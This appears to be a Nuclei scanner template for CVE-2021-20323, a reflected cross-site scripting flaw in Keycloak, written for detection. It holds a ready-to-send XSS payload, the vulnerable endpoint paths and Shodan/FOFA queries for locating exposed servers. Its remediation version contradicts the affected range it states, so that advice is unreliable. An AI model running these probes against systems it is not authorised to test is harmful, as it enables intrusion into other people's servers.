http:
- body: '{"Test<img src=x onerror=alert(document.domain)>":1}'
  headers:
    Content-Type: application/json
  matchers:
  - part: body
    type: word
    words:
    - Unrecognized field "Test<img src=x onerror=alert(document.domain)>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 400
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/auth/realms/master/clients-registrations/default'
  - '{{BaseURL}}/auth/realms/master/clients-registrations/openid-connect'
  - '{{BaseURL}}/realms/master/clients-registrations/default'
  - '{{BaseURL}}/realms/master/clients-registrations/openid-connect'
  stop-at-first-match: true
id: CVE-2021-20323
info:
  author: ndmalc,incogbyte
  classification:
    cpe: cpe:2.3:a:redhat:keycloak:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-20323
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.98606
    epss-score: 0.7008
  description: 'Keycloak 10.0.0 to 18.0.0 contains a cross-site scripting vulnerability
    via the client-registrations endpoint. On a POST request, the application does
    not sanitize an unknown attribute name before including it in the error response
    with a ''Content-Type'' of text/hml. Once reflected, the response is interpreted
    as HTML. This can be performed on any realm present on the Keycloak instance.
    Since the bug requires Content-Type application/json and is submitted via a POST,
    there is no common path to exploit that has a user impact.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - title="keycloak"
    - icon_hash=-1105083093
    - body="keycloak"
    google-query: intitle:"keycloak"
    max-request: 4
    product: keycloak
    shodan-query:
    - html:"Keycloak"
    - http.title:"keycloak"
    - http.html:"keycloak"
    - http.favicon.hash:-1105083093
    vendor: redhat
    verified: true
  name: Keycloak 10.0.0 - 18.0.0 - Cross-Site Scripting
  reference:
  - https://github.com/keycloak/keycloak/security/advisories/GHSA-m98g-63qj-fp8j
  - https://bugzilla.redhat.com/show_bug.cgi?id=2013577
  - https://access.redhat.com/security/cve/CVE-2021-20323
  - https://github.com/ndmalc/CVE-2021-20323
  - https://github.com/keycloak/keycloak/commit/3aa3db16eac9b9ed8c5335ac86f5f50e0c68662d
  - https://nvd.nist.gov/vuln/detail/CVE-2021-20323
  remediation: 'Upgrade Keycloak to a version that is not affected by the vulnerability
    (10.0.1 or higher).

    '
  severity: medium
  tags: cve2021,cve,keycloak,xss,redhat,vuln
